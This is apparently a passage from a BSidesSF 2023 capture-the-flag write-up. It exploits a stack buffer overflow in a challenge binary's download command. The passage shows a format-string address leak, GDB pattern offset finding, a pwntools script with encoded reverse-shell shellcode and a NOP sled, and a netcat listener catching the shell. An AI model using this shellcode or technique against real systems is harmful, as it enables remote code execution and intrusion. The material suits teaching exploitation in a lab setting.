AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/distfiles]
└─━ [*]$ 

```

It appears that we have a segmentation fault when running the `download` command. Given that the only buffer being filled in the download function is the one containing the output from the SQL query, we can assume that it's the file from the database which is causing the overflow. So, we need to upload, a file with shellcode at the start (since we have the memory address for it), enough padding to cause the overflow, and then the address to return to the start of the buffer. 

First, we'll make a Python script with the following setup:

```python
from pwn import *
import os

#Setting up the environment

context(terminal=['tmux', 'new-window'])

p = gdb.debug('../distfiles/files', 'b main')

context(os="linux", arch="amd64")


```

Following the environment setup, we'll need to get the memory address that we want to return to. We can do that with the following code:

```python
#Getting the heap address

payload = b"upload,%p.%p.%p.%p.%p.%p,AAAA"

p.recvuntil("command")
p.sendline(payload)
p.recvuntil("name:")
rip = p.recvuntil("\n").decode('utf-8').split(".")[5].split("\n")[0]
rip = bytes(reversed(bytes.fromhex(rip[2:])))

```

Next, we'll add the code which stages and sends our buffer overflow payload (which will also contain our shellcode).

```python
#Buffer Overflow

p.recvuntil("command")
p.sendline(payload)
p.recvuntil(": test")
p.recvuntil("command")
p.sendline("download,test")
p.interactive()
```

Now we need to figure out how much padding is necessary to overwrite the `rip`. This can be done by using the `pattern_create` command in GDB.

```default
gdb-peda$ pattern_create 2000                                                                                                                     
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAAR
AAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%
KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)A
sEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsX
AsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9AB
OABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A
$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$Ann
AnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAn
UAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7A
CMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1
A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-
yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA
(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5
ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'
gdb-peda$
```

We can then modify the payload just before the buffer overflow is executed to include this pattern. 

```python

payload = b'upload,test,AAA%AA ... ADwA'

```

When we run our script, we get the following error in GDB: 

```default
[------------------------------------stack-------------------------------------]
0000| 0x7ffe83b1a448 ("n-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACC"...)
0008| 0x7ffe83b1a450 ("An;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(AC"...)
0016| 0x7ffe83b1a458 ("EAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)A"...)
0024| 0x7ffe83b1a460 ("nFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0"...)
0032| 0x7ffe83b1a468 ("AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC"...)
0040| 0x7ffe83b1a470 ("2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcA"...)
0048| 0x7ffe83b1a478 ("n3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACd"...)
0056| 0x7ffe83b1a480 ("An4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIAC"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00005591bebae8c0 in download ()
gdb-peda$ 
```

We can now take the data found in the stack and obtain an offset which will allow us to control the `rip`.

```default
gdb-peda$ pattern_offset n-An(AnDAn;An)
n-An(AnDAn;An) found at offset: 1025
gdb-peda$ 
```

Let's confirm this offset by using the following payload:

```python
payload = "upload,test,"+"A"*1025+"B"*6*
```

After running the script, we can see that the `rip` is in fact under our control.

```default
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x424242424242
[------------------------------------stack-------------------------------------]
0000| 0x7ffebbdb0540 ('A' <repeats 200 times>...)
0008| 0x7ffebbdb0548 ('A' <repeats 200 times>...)
0016| 0x7ffebbdb0550 ('A' <repeats 200 times>...)
0024| 0x7ffebbdb0558 ('A' <repeats 200 times>...)
0032| 0x7ffebbdb0560 ('A' <repeats 200 times>...)
0040| 0x7ffebbdb0568 ('A' <repeats 200 times>...)
0048| 0x7ffebbdb0570 ('A' <repeats 200 times>...)
0056| 0x7ffebbdb0578 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 in ?? ()
gdb-peda$ 
```

Now that we've got control of the `rip` we can set it to the previously leaked value and create our final payload.

```python
#Crafting the payload

nopsled = b"\x90"*20

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x30\xda\xf1"
shellcode += b"\x89\x18\x6f\x98\x9c\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x5a\xf3\xa9\x10\x72"
shellcode += b"\x6d\xc7\xf6\x31\x84\xfe\x8c\x50\xf8\xd0\x25"
shellcode += b"\x32\xda\xe0\xd5\x67\x6f\x98\x9d\x61\x92\x78"
shellcode += b"\x6f\x72\x7f\xc2\xf6\x1a\x82\xfe\x8c\x72\x6c"
shellcode += b"\xc6\xd4\xcf\x14\x9b\xa8\x40\x60\x9d\xe9\xc6"
shellcode += b"\xb0\xca\xd1\x81\x27\x23\xb3\x52\xb3\x9f\xa6"
shellcode += b"\x6b\x07\x98\xcf\x78\x53\x16\xdb\x4f\x27\x11"
shellcode += b"\x7a\x3f\xdf\xf1\x89\x18\x6f\x98\x9c"

junk = "\x41"*(1025-len(nopsled)-len(shellcode))
payload = bytes("upload,test,", 'utf-8') + nopsled + shellcode + bytes(junk, 'utf-8') + rip
```

Now all that's left is to run our finalized script and get our reverse shell. 

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/solution]
└─━ [*]$ python3 exploit2.py
```

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files]
└─━ [*]$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42324
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),132(scanner)

```